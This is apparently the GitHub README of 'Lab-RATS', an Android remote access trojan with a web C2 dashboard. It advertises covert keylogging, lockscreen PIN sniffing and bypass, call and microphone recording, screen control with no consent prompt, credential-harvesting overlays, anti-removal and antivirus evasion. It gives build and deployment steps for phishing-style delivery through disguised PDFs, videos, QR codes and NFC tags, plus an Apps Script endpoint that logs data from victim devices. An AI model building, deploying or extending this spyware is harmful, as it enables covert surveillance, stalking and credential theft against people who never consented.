<p align="center">
<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind...-cyan?style=for-the-badge&logo=maserati&logoColor=black">
  
<p align="center">
<img width="1409" height="516" alt="Screenshot 2026-11-27 at 1 17 52 AM" src="https://github.com/user-attachments/assets/26b8c794-8426-483c-846c-a28326f91e7e" />

<p align="center">
  <img src="https://img.shields.io/badge/JDK-17/21-gold?style=for-the-badge&logo=openjdk&logoColor=white">
  <img src="https://img.shields.io/badge/android-SDK_36-green?style=for-the-badge&logo=android&logoColor=white">
  <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
  <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
  <img src="https://img.shields.io/badge/relay-node.js-darkgreen?style=for-the-badge&logo=nodedotjs&logoColor=white">
 <br>
  <img src="https://img.shields.io/badge/Network-IPv6/IPv4-informational?style=for-the-badge&logo=gitconnected&logoColor=white">
  <img src="https://img.shields.io/badge/Stealth_Mode-Ghost-white?style=for-the-badge&logo=ghostfolio&logoColor=white">
  <img src="https://img.shields.io/badge/C2-render-black?style=for-the-badge&logo=render&logoColor=white">
  <img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=openaccess&logoColor=white">
</p>

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=38&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"
 />
</p>

> Lightweight Android-Based Remote Administration Tool for Security: *(L.A.B. - R.A.T.S.)*

Developed from the ground up by **K4N3CO**, **Lab-RATS** is an **open-source, lightweight Android Remote Administration Framework** packed with **real-time telemetry** and **covert control capabilities**. The framework **automates the generation of custom, signed `.apk` payloads** for seamless deployment onto **any Android devices**, paired with a **responsive, web-based C2 dashboard**. Engineered for **resilience in modern mobile security environments**, **Lab-RATS** delivers a **robust feature suite** operating reliably across both **legacy** and **current Android OS releases**.
<details>
  <summary><b>📸 View Comparative Breakdown</summary></b>
  <br>
  <img width="420" height="500" alt="Screenshot 2026-11-16 at 5 24 11 PM" src="https://github.com/user-attachments/assets/3dd73ef0-8f95-4be3-8cca-e5d55048fab3" />
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Direct+IPv6+Access" 
alt="Typing Banner"
 />
</p>

## 🌐 How Direct IPv6 Mode Works in Lab-RATS
<details>
<summary><b>What is Direct IPv6 Mode?</b></summary>
<br>

In **Direct IPv6 Mode**, the **target Android device itself acts as the C2 web server**. An embedded HTTP server (`NanoHTTPD`) runs inside the **background Android service** and listens directly on port `9191`.

</details>

<details>
<summary><b>The IPv6 Advantage: Eliminating CGNAT & Port Forwarding</b></summary>

#### The Traditional IPv4 Problem:
* On standard IPv4 mobile networks (3G/4G/5G), cellular carriers place devices behind **Carrier-Grade NAT (CGNAT)**. This shares a single public IP address among thousands of mobile devices, making incoming connections impossible without port forwarding, reverse proxies, or tools like Ngrok.

#### The IPv6 Solution:
* IPv6 assigns a unique **Global Unicast Address (GUA)** directly to the phone on 5G/LTE and Wi-Fi networks. Because every IPv6 address is globally unique and addressable across the internet, the C2 operator can connect directly to the target phone using its IPv6 address in any web browser (`http://[2001:db8::1]:9191`).

</details>

<details>
<summary><b>Zero-Configuration Peer-to-Peer (P2P) Control</b></summary>
<br>

* **No Cloud Relay Required:** Traffic flows directly between the operator's browser and the target device without passing through an intermediate cloud server.
* **No Router Access Needed:** Eliminates the need to access the target's Wi-Fi router or configure firewall rules.
* **Low Latency:** Eliminating middleman servers results in instant command execution and live screen streaming.

</details>

<details>
  <summary><b>📸 Click to View IPv6 Exploit Vector</summary></b>
  <img src="https://github.com/user-attachments/assets/7097e0e0-1190-4774-b758-ca58b5e8760f" alt="Full Web Page Screenshot" width="65%">
</details>
    
> [!NOTE]
> **Lab-RATS also supports IPv4 connections** by **hosting on Render.com** *(Free Tier Supported)*. See **"Command & Control Option 2"** below for the **setup guide**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"/>
</p>

  > [!IMPORTANT]
  > DEFAULT PASSWORD = admin1337

<details>
  <summary><b>🔐 Remote C2 Security & Secure Handshake</b></summary>
  <br>
  <ul>
    <li><strong>C2 Security:</strong> The <strong>C2 Dashboard</strong> is <strong>protected with a secure login</strong> which can be changed during build setup <strong>or directly from the C2's Terminal Tab</strong>. The <strong>Default Password should be changed immediately</strong> for <strong>enhanced security</strong>.</li>
    <li><strong>Secure Handshake:</strong> Uses a <strong>masked credential handshake</strong>. Passwords are <strong>reversed and Base64 encoded</strong> <em>(<code>0x_</code> prefixed)</em> on the <strong>client-side before transmission</strong>, rendering them <strong>invisible to browser Network/Payload inspectors</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>📦 Automated APK Generation, Identity Control & Density Scaling</b></summary>
  <br>
  <ul>
    <li><strong>Instant Build:</strong> Instantly build custom <code>signed.apk</code> for <strong>production</strong> and <strong>testing</strong>.</li>
    <li><strong>Full Customization:</strong> Fully customize <strong>App Name</strong>, <strong>Package ID</strong>, and <strong>Minimum SDK</strong>.</li>
    <li><strong>Density Scaling:</strong> Resizes logos automatically for <strong>all Android screen densities</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>📱 PC/Mobile Responsive</b></summary>
  <br>
  <ul>
    <li><strong>Adaptive Dashbaord:</strong> The Remote Web Dashboard is fully optimized for <strong>both PC</strong> and <strong>smartphone browsers</strong>, featuring a touch-friendly layout, adaptive navigation tabs, and scalable UI elements   for <strong>monitoring from any device</strong>.</li>
 </ul>
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"/>
</p>

<details>
  <summary><b>🎭 Stealth App Decoys</b></summary>
  <br>
 <strong>Execute an instant remote swap of the Lab-RATS app identity and icon using realistic, operational clones from the "Masquerade Library"</strong>:
  <ul><br>
    <li><strong>👀 Play Protect (Default):</strong> Used for initial install it <strong>simulates a system update with masked auto permission granting</strong> to achieve <strong>highly successful installs</strong>.</li>
    <li><strong>🧮 Calculator:</strong> Performs actual math with a <strong>tactical logic engine</strong>.</li>
    <li><strong>🌦️ Weather App:</strong> Displays <strong>real-time localized forecasts</strong> via <strong>Open-Meteo API</strong>.</li>
    <li><strong>🛡️ Software Updated:</strong> Simulates a legitimate One UI 'system has been updated' screen to <strong>build target trust</strong>.</li>
    <li><strong>🧠 Smart Tutor:</strong> Single screen overlay that looks innocuous and easily <strong>blends into the stock samsung app lists.</strong></li>
    <li><strong>🐭 Lab-Rats & System Stability Services:</strong> Completely unmasked and <strong>directly opens</strong> the C2 server interface on device.</li>
 </ul>
</details>

<details>
  <summary><b>💉 APK Delivery Vectors</b></summary>
  <br>
  <ul>
    <li><strong>Weaponization Engine:</strong> The <strong>Weaponization Engine</strong> has been overhauled to support multiple high-success delivery methods <em>(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)</em>, ensuring reliable access across <strong>all modern mobile environments</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🛡️ Evasion Engine</b></summary>
  <br>
  <ul>
    <li><strong>AV/AVE Bypasses:</strong> Undetectable by <strong>Samsung Knox</strong>, <strong>McAfee</strong> and <strong>Google Play Protect</strong>.</li>
    <li><strong>Deep Stealth HTML Shield:</strong> The C2 dashboard utilizes <strong>Shadow DOM Cloaking</strong> and <strong>Base64 Payload Wrapping</strong>. Browser "Inspect Elements" is zeroed-out, and the tactical structure is <strong>ghosted from analysts</strong>.</li>
    <li><strong>Web Hardening:</strong> Assets <em>(JS/CSS)</em> are <strong>minified and obfuscated</strong>; featuring anti-debugging loops and interaction locks <em>(Right-Click, F12)</em> to <strong>prevent unauthorized analysis</strong>.</li>
    <li><strong>Dynamic Code Obfuscation:</strong> Build-time randomization of logic flow and class names via <strong>ProGuard/R8 integration</strong>.</li>
    <li><strong>Encrypted Local Telemetry:</strong> Internal system logs are encrypted at build-time, rendering them <strong>unreadable to standard mobile forensic tools</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>☎️ Emergency Recovery & Self Healing</b></summary>
  <br>
  <ul>
    <li><strong>Dialer Unlock:</strong> Type <code>*#1337#</code> on the <strong>Target Phone's Dialpad</strong> to unmask the Lab-RATS server interface back into view.</li>
    <li><strong>Hidden Backdoor:</strong> If the device is in stealth mode, rapidly tap the middle of the decoy screen 10 times to <strong>unlock the C2 server interface</strong>. <em>(Reverts to stealth mode again once app is closed)</em></li>
    <li><strong>Self-Healing Engine:</strong> Automatically detects and repairs damaged <strong>service bindings or revoked permissions in the background</strong>.</li>
    <li><strong>Anti-Removal:</strong> On by default in the <strong>Ghost Tab</strong>, it prevents the user from <strong>uninstalling</strong> or <strong>force-stopping the app</strong> via Settings.</li>
 </ul>
</details>

<details>
  <summary><b>🔄 Remote Server Restart</b></summary>
  <br>
  <ul>
    <li><strong>Web UI Restart:</strong> One-click "RESTART_SERVER" button on the Terminal tab to <strong>refresh background services</strong>.</li>
    <li><strong>SMS Backdoor Trigger:</strong> Send an <strong>SMS/Text containing <code>!RESTART_C2</code></strong> to the target device's number to force the server back online even if it was <strong>manually closed or killed by the OS</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>👻 Task-List Ghosting & Dynamic OTA Camouflage</b></summary>
  <br>
  <ul>
    <li><strong>Recent Apps Ghosting:</strong> The app is hard-coded to be <strong>invisible in the Android "Recent Apps" list and "1 Active App" notification</strong>.</li>
    <li><strong>Dynamic OTA Camouflage:</strong> Generates random version names and codes that <strong>mimic legitimate system OTA updates</strong>.</li>
 </ul>
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"/>
</p>

<details>
  <summary><b>👻 Ghost Operations</b></summary>
  <br>
  <ul>
    <li><strong>Ghost Control / Live Feed:</strong> Cast & Control the live screen remotely with <strong>NO "Consent Prompt" required</strong>.</li>
    <li><strong>Blackout Mode:</strong> A high-stealth mode designed to mask the target's device display while maintaining a <strong>NON-masked live remote feed</strong>. <em>(Pair with Ghost Control for maximum stealth)</em></li>
    <li><strong>Ghost_Toast Overlays:</strong> Remotely deploy tactical, persistent pop-ups with fully customizable text <em>(color, size, and screen positioning)</em>. Features multiple animation styles <em>(pop, static, and side-scroll)</em> alongside a <strong>high-intensity "Burnt_Toast" mode</strong> that <strong>floods the screen with randomized pop-ups</strong> to overwhelm the device.</li>
    <li><strong>Remote System Denial Lock:</strong> Deploy a persistent, full-screen security overlay to <strong>lock physical interaction</strong> and <strong>render the device inoperable until hard-reset/restarted</strong> or <strong>unlocked remotely from the C2 dashboard</strong>.</li>
    <li><strong>Live Keylogging & Sensitive Extraction:</strong> Intercept keystrokes and system text in real-time. Features <strong>Sensitive Info Highlighting</strong> <em>(Passcodes, OTPs, Emails glow Red)</em> and <strong>Deep Extraction</strong> for <strong>browser login info</strong>.</li>
 </ul>
</details>

<details>
<summary><b>⚡ Lockscreen Bypass Engine & Credential Sniffer</b></summary>
<br>

- **Multi-OEM Sniffing**: Auto Captures 4–6 digit PINs entered by user on **Samsung, Pixel, Xiaomi**, and **Motorola** lockscreens.
- **Lock Bypass Trigger**: Once captured, if `BYPASS_LOCKSCREEN` *(green when PIN captured)* is clicked from the C2's Ghost Tab, the system **auto wakes screen and enters the captured PIN**.

</details>

<details>
  <summary><b>📸 Tactical Surveillance Hub (Ultra-Stability)</b></summary>
  <br>
  <ul>
    <li><strong>Covert Video Recording:</strong> Stealthily record video without any <strong>user-facing activity</strong>.</li>
    <li><strong>Covert Photo Capture:</strong> Covert image capture integrated into the <strong>live stream</strong>.</li>
    <li><strong>Nightmode V2:</strong> Aggressive electronic brightening for <strong>low-light environments</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🧪 Exploit Factory</b></summary>
  <br>
  <ul>
    <li><strong>NFC Proximity Vector:</strong> Generate <strong>binary NDEF payloads for physical tags</strong>.</li>
    <li><strong>QR Visual Vector:</strong> Dedicated <strong>high-density QR code generator</strong> for independent URL delivery.</li>
    <li><strong>Smishing Library:</strong> Pre-configured <strong>tactical phishing templates</strong>.</li>
    <li><strong>Shadow Overlay Injection:</strong> Remotely inject functional, <strong>credential-harvesting overlays</strong> to the device.</li>
 </ul>
</details>

<details>
  <summary><b>💀 Anti-Removal & Self Destruct</b></summary>
  <br>
  <ul>
    <li><strong>Anti-Removal Shield:</strong> High-speed, event-driven protection shield that <strong>Blocks Attempts</strong> to <strong>Uninstall</strong> or <strong>Force Stop</strong> the <strong>app</strong>.</li>
    <li><strong>Suicide (Self-Destruct):</strong> Remote-triggered persistent loop that <strong>wipes all local configurations</strong> and <strong>initiates a hard uninstallation of the C2 Core</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🛰️ GPS Tracking & Intel Stream</b></summary>
  <br>
  <ul>
    <li><strong>GPS Uplink:</strong> One-click uplink to open the <strong>device's exact real-time location</strong> using <strong>Google Maps</strong>.</li>
    <li><strong>Notification Stream:</strong> Intercepts every app notification <em>(WhatsApp, Telegram, RCS, System...etc)</em> in a <strong>live feed</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🎙️ Acoustics & Interception</b></summary>
  <br>
  <ul>
    <li><strong>Microphone & Call Recording:</strong> Timed or Live microphone recording and automated call recording for <strong>both incoming and outgoing calls</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>📂 Advanced Data Uplink</b></summary>
  <br>
  <ul>
    <li><strong>Info Gathering:</strong> Access <strong>Call Logs</strong>, <strong>Contacts</strong>, <strong>Hardware Analytics</strong>, and <strong>Installed Apps</strong> remotely.</li>
    <li><strong>Integrated File Manager:</strong> Navigate, download, and manage files. Features an <strong>instant Search Bar</strong> and <strong>Category Filters</strong>.</li>
    <li><strong>Direct File Editor:</strong> Live-edit text, JSON, and log files directly <strong>on the device</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🖥️ Enhanced Remote Shell</b></summary>
  <br>
  <strong>The Terminal Tab's Built-in Shell has been overhauled for professional workflows:</strong>
  <ul><br>
    <li><strong>Command History:</strong> Navigate previous commands instantly using <strong>Up/Down arrows</strong>.</li>
    <li><strong>Modernized Interface:</strong> Updated to <code>User@Android</code> prompt with <strong>an updated <code>help</code> menu</strong>.</li>
    <li><strong>Hardened I/O:</strong> Multi-stage retry logic and unique execution tracking for <strong>zero-latency command output</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>📊 Telemetry & Reporting</b></summary>
  <br>
  <ul>
    <li><strong>C2 Auto-Reporting:</strong> Discrete reporting of <strong>Date & Time, Device ID, Connection Type <em>(WiFi/Cellular)</em>, IP, Port, C2 Dashboard Link, Battery % and more</strong> to a centralized Google Sheet or Render C2</strong>.</li>
 </ul>
</details>

<details>
  <summary><b>🛠️ Termux Bridge Integration</b></summary>
  <br>
  
  <strong>Lab-RATS features a high-performance bridge to the Termux environment. If Termux is installed on the target device, the remote terminal can instantly elevate its capabilities:</strong>
  <ul>
    <li><strong>Auto-Routing:</strong> Common commands like <code>pkg</code>, <code>apt</code>, <code>pip</code>, and <code>python</code> are <strong>routed through the bridge</strong>.</li>
    <li><strong>Unrestricted Tools:</strong> Install and run <strong>Python scripts, Nmap scans, or Metasploit</strong> from the <strong>C2 web terminal</strong>.</li>
    <li><strong>Persistent Environment:</strong> Full support for <strong>Termux's internal storage</strong> and <strong>standard Linux binaries</strong>.</li>
  </ul>
  
  > **Termux Bridge Issues**:<br>
  > <br>**ISSUE** - "Termux `allow-external-apps` setting is disabled" *(Most Common)*.<br>
  > **FIX** - On the **Target Device** open Termux and run:
  ```
  echo "allow-external-apps = true" >> ~/.termux/termux.properties
  termux-reload-settings
  ```
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"/>
</p>

> To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your Environment meets the following requirements**:

<details>
  <summary><b>🛠️ 1. Workstation & Build Requirements (To Build APKs)</b></summary>
  <br>
  <ul>
    <li><strong>Java Development Kit (JDK):</strong> JDK <strong>17 or JDK 21</strong>. Ensure <code>JAVA_HOME</code> is set in <strong>your environment paths</strong>.</li>
    <li><strong>Android Software Development Kit (SDK):</strong> Android <strong>SDK 34</strong> or <strong>higher</strong>. Build-Tools version <code>34.0.0</code> or <strong>higher</strong> <em>(includes <code>aapt2</code>, <code>zipalign</code>, and <code>apksigner</code>)</em>.</li>
    <li><strong>Python 3.x:</strong> Required for <strong>Option 7: Smali Surgery & APK Binder</strong> <em>(<code>binder.py</code>)</em>.</li>
    <li><strong>Gradle:</strong> Handled <strong>automatically</strong> via the included <code>./gradlew</code> <em>(Gradle 8.10+)</em>.</li>
  </ul>
</details>

<details>
  <summary><b>☁️ 2. C2 Server Hosting Requirements (For Option 2: Render.com/Railway)</b></summary>
  <br>
  <ul>
    <li><strong>Node.js:</strong> <strong>v18.0.0</strong> or <strong>higher</strong>.</li>
    <li><strong>npm:</strong> <strong>v9.0.0</strong> or <strong>higher</strong>.</li>
    <li><strong>Render / Linux Hosting:</strong> <strong>512 MB RAM</strong> minimum <em>(Render Free Tier supported)</em>.</li>
  </ul>
</details>

<details>
  <summary><b>📱 3. Android Device Compatibility</b></summary>
  <br>
  <ul>
    <li><strong>Minimum OS:</strong> Android <strong>5.0</strong> <em>(Lollipop/API 21)</em> or <strong>higher</strong>.</li>
    <li><strong>Target OS:</strong> Android <strong>14 - 17</strong> <em>(API 34 - 37)</em> <strong>fully supported</strong>.</li>
    <li><strong>Supported Devices:</strong> Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG, and generic Android devices/emulators.</li>
  </ul>
</details>

<details>
  <summary><b>💻 4. Operating System Compatibility</b></summary>
  <br>
  <ul>
    <li><strong>🐧 Linux:</strong> Kali Linux, Ubuntu, Debian, Arch <em>(Full support for build scripts & C2 server)</em>.</li>
    <li><strong>🍎 macOS:</strong> macOS Monterey / Ventura / Sonoma / Sequoia <em>(Intel & Apple Silicon M1/M2/M3/M4)</em>.</li>
    <li><strong>🪟 Windows:</strong> Windows 10 / 11 via PowerShell, Command Prompt, or WSL2.</li>
  </ul>
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"/>
</p>

> **Lab-RATS** supports **TWO primary methods** to **Receive Data, Connect Remotely & Track your Devices**.
<details>
  <summary><b>📸 View Direct IPv6 (Google Sheet) vs. Render Cloud Relay (Node.js) Chart</summary></b>
  <br>
  <img width="730" height="370" alt="Screenshot 2026-11-16 at 5 24 11 PM" src="https://github.com/user-attachments/assets/a95fdd22-1226-45ab-ae61-b099a7d0311b" />
</details>

### ☝🏻 Option 1: Direct IPv6 (Google Sheet) 
**Best for Basic IP tracking** & **logging**. **NO server maintenance required!**.

1. Create a **New** <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
2. Navigate to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**

```javascript
function doGet(e) { return handleRequest(e); }
function doPost(e) { return 
handleRequest(e); }

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
    
    // Auto-initialize headers if new sheet
    if (sheet.getLastRow() == 0) {
      sheet.appendRow([
        "Timestamp", 
        "Model #", 
        "Connection Type", 
        "IP Address", 
        "Port", 
        "Active C2 Link", 
        "Battery", 
        "Stealth Status", 
        "Power", 
        "Free Storage"
      ]);
    }
    
    var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
    
    var row = [
      new Date(),
      data.device || data.model || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "9191",
      data.link || "Handshake_Pending",
      data.battery || "0%",
      (data.stealth === true || 
data.stealth === "true") ? "ACTIVE" : "OFF",
      data.charging || "Discharging",
      data.storage || "Unknown"
    ];
    
    sheet.appendRow(row);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}
```
3. Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-Mail)* → **Who has Access: Anyone**.

> [!IMPORTANT]
> 4. **Copy the Google Webhook URL provided** *(e.g., `https://script.google.com/macros/s/AKfycbwXQSVQ...`)* and **prepare to enter it into the APK-Builder when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.

<details>
  <summary><b>📸 View Google Sheet Reporting Example</summary></b>
  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="90%">
</details>

---

### ✌🏻 Option 2: Render Cloud Relay (Tactical Node.js Backend)
> **Best for newer devices running Android 16/17, Professional Fleet Management** & **Automatic File Exfiltration**.<br>

**1. Fork the Lab-RATS repository**.
<br>**2. Create a New Web Service for Free** on <a href="https://render.com" target="_blank">Render.com</a> and **connect your forked Lab-RATS repo**.
<br>**3. Once connected, Set the Root Directory** to `c2-server/`
<br>**4. Set the Build Command** to `npm install` & **the Start Command** to `npm start`
<br>**5. Deploy!**

> [!IMPORTANT]
> **Once live, Copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, and **prepare to enter it into the APK-Builder when prompted** for the **C2 Webhook URL** *(Get Started Section Below)*.

<details>
  <summary><b>🌐 Advantages of Option 2</b></summary>
  <br>
  <ul>
    <li><strong>Dual-Stack IP Binding:</strong><br>
  <strong>Full support for both IPv4 and IPv6 connections</strong>, <strong>enabling seamless C2 telemetry</strong> and <strong>reverse WebSocket tunneling</strong> across <strong>cellular carrier NAT64</strong> and <strong>dual-stack Wi-Fi networks worldwide</strong>.</li>
    <li><strong>Exfiltration Vault:</strong><br>
  <strong>Audio/Video recordings</strong> are <strong>automatically uploaded</strong> and <strong>stored on your server</strong>.</li>
    <li><strong>Live Fleet List:</strong><br>
  A <strong>professional dashboard</strong> to <strong>manage all devices in one place</strong>, with <strong>editable device name</strong> for <strong>easy device recognition</strong> and <strong>NEW 'Quick Action' pull-down menu</strong> to <strong>deploy some features without directly connecting</strong>.</li>
    <li><strong>Dynamic Sync:</strong><br>
  <strong>Heartbeat reporting</strong> ensures your <strong>P2P links are always up-to-date</strong>.</li>
  </ul>
</details>

<details>
  <summary><b>📸 View Render Setup</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/7cc93099-7528-40b1-b261-de7f72dfc54a" alt="Full Web Page Screenshot" width="50%">
  <img src="https://github.com/user-attachments/assets/bc6d4e57-3053-4d21-b46e-f3241cdb959a" alt="Full Web Page Screenshot" width="50%">
  </details>

<details>
  <summary><b>📸 View Render C2 Screenshot</summary></b>
  <br>
  <img width="767" height="400" alt="Screenshot 2026-11-14 at 3 00 47 PM" src="https://github.com/user-attachments/assets/02cd24bc-ed70-421a-98ab-b8769b9dce52" />
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Get+Started" alt="Typing Banner"
 />
</p>

### 1. Build the APK (on PC)

  #### Download the Repository:
  ```
  git clone https://github.com/K4N3CO/Lab-RATS.git
  cd /Lab-RATS/apk-builder/
  ```
  #### Execute the Builder:
  > **Mac/Linux**:
  ```
  chmod +x build.sh && ./build.sh
  ```
  > **Windows**:
  ```
  build.bat
  ```

  **Select a Build Strategy**:
  
   *   **Option 1 (Manual)**: For **standard configuration** of **App Name, ID**, and **Logo** before **building**.
   *   **Option 6 (Infection Chain Wizard)**: For the **Full Build → Host → Weaponize** flow.

> [!IMPORTANT]
>  **Enter** your **Google Sheet Webhook URL or Render URL** when **prompted to enable remote device IP reporting and connections** *("Command & Control Options" section above)*.

  **Retrieve your** `signed_v*.apk` *(and any weaponized payloads like PDFs or MP4s)* from `Lab-RATS/apk-builder/output/`

<details>
  <summary><b>📸 View APK-Builder Tool</summary></b>
  <img src="https://github.com/user-attachments/assets/3b16fac1-c679-46d0-9e9d-57335c897313" alt="Full Web Page Screenshot" width="40%">
</details>

### 2. Deploy & Install onto Android Devices
> **Deployment** is **a Multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.

<details>
  <summary><b>📑 Strategic Weaponization (The Wrapper)</b></summary>
  <br>
  <strong>Standard <code>.apk</code> files are often blocked by email filters and browser security. Use the Infection Chain Wizard <em>(Option 6)</em> in the <code>apk-builder</code> tool to wrap your link inside a high-compatibility carrier file:</strong>
  <ul><br>
    <li><strong>📑 Stealth PDF:</strong><br>
  Send to <strong>targets via Email or Drive</strong>. Utilizes <strong>URI Actions</strong> instead of <strong>JavaScript</strong> to trigger an <strong>automatic browser-based download, bypassing standard PDF security filters</strong>.</li>
    <li><strong>🎬 Zero-Click MP4:</strong><br>
  <strong>Send as a video file</strong>. Exploits mobile <strong>Media Heap Overflows</strong> during <strong>gallery indexing or thumbnail generation</strong> to <strong>force-register the C2 link in the background</strong>.</li>
    <li><strong>🔳 QR Code / 📡 NFC:</strong><br>
  <strong>Best for physical placement</strong> or <strong>"Tap-to-Infect" proximity delivery</strong>. Generates a <strong>high-density QR</strong> or <strong>NDEF record</strong> pointing to the <strong>hardened delivery URL</strong>.</li>
    <li><strong>And Many More:</strong><br>
  The <strong>Wizard</strong> also supports <strong>ADB Strategic Bridge, Stego Image Tails, PWA Manifests</strong>, and <strong>Office Document macros</strong>.</li>
  </ul>
</details>

<details>
  <summary><b>🌐 Hosting Strategies</b></summary>
  <br>
  <ul>
    <li><strong>Anonymous Cloud:</strong><br>
  <strong>Option 6</strong> uses <code>Catbox.moe</code> <strong>by default</strong>. It is <strong>anonymous, fast</strong>, and <strong>generates a direct link</strong>. Features <strong>fallback hosting on <code>Litterbox</code> or <code>Tmpfiles</code> if <code>Catbox.moe</code> fails</strong>.</li>
    <li><strong>P2P Direct:</strong><br>
  Host the <strong>APK directly from your PC using a public tunnel</strong>, or from <strong>another infected device</strong> using the <code>/download/</code> endpoint.</li>
  </ul>
</details>

<details>
  <summary><b>🚀 Installation & Initialization</b></summary>
  <br>
  <strong>Once the target device downloads the APK:</strong>
  <ul><br>
    <li><strong>1. Manual Sideload:</strong><br>
  If you have <strong>physical access to the device</strong>, use <code>adb install signed.apk</code></li>
    <li><strong>2. Masked 'One-Click' Permission Granting (CRITICAL):</strong><br>
  Open the app ONCE. Only the initial Pop-up <em>(Accessibility Services)</em> must be manually toggled on; <strong>ALL other permissions are now auto-granted & hidden by the system</strong> using a convincing security sequence.</li>
    <li><strong>3. Remote Permission Prompt:</strong><br>
  If a <strong>user removes any permissions</strong>, you can <strong>remotely trigger the system prompts again</strong> using the <strong>repair buttons</strong> in the <strong>GHOST UTILITIES</strong> section.</li>
    <li><strong>4. Self-Vanishing:</strong><br>
  A few seconds after launch, the app will <strong>automatically replace its icon and name</strong> with the <strong>decoy you chose during build</strong> <em>("System Update", "Calculator"...etc)</em>.</li>
    <li><strong>5. Uplink Confirmation:</strong><br>
  Check your <strong>Google Sheet or Render C2</strong>. <strong>Within 5 seconds of initialization</strong>, the <strong>Device ID, Connection Type, IP, Port, C2 Dashboard Link, Battery % and more will appear in the log</strong>.</li>
  </ul>
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Documentation+Index" alt="Typing Banner"/>
</p>

| File                                                               | Subject & Contents                                                  |
|:-------------------------------------------------------------------|:--------------------------------------------------------------------|
| **[00-Quickstart.md](docs/00-Quickstart.md)**                           | 3-step quickstart guide from clone to live dashboard connection.    |
| **[01-Requirements.md](docs/01-Requirements.md)**                       | Workstation build host, JDK, Android SDK, and device compatibility. |
| **[02-Building Payloads.md](docs/02-Building_Payloads.md)**             | Builder menu options, configuration keys, and decoy personas.       |
| **[03-C2 Deployment.md](docs/03-C2_Deployment.md)**                     | C2 deployment options: Render C2 relay, Direct IP, Google Sheets.   |
| **[04-Device HTTP-API.md](docs/04-Device_HTTP-API.md)**                 | Device HTTP API reference for control endpoints.                    |
| **[05-Dashboard Reference.md](docs/05-Dashboard_Reference.md)**         | Overview of the 13 C2 dashboard tabs and features.                  |
| **[06-Stealth and Persistence.md](docs/06-Stealth_and_Persistence.md)** | Decoy personas, 10-tap backdoor, watchdog layers, and anti-removal. |
| **[07-Troubleshooting.md](docs/07-Troubleshooting.md)**                 | Solutions for common build, installation, and connection issues.    |
| **[08-Architecture.md](docs/08-Architecture.md)**                       | High-level system architecture diagram and component map.           |
| **[09-Security Notes.md](docs/09-Security_Notes.md)**                   | Security considerations, authentication, and forensic reduction.    |
| **[10-FAQ.md](docs/10-FAQ.md)**                                         | Frequently asked questions and answers.                             |
| **[11-Maintaining Your Fork.md](docs/11-Maintaining_Your_Fork.md)**     | Guidelines for rebranding and syncing upstream updates.             |
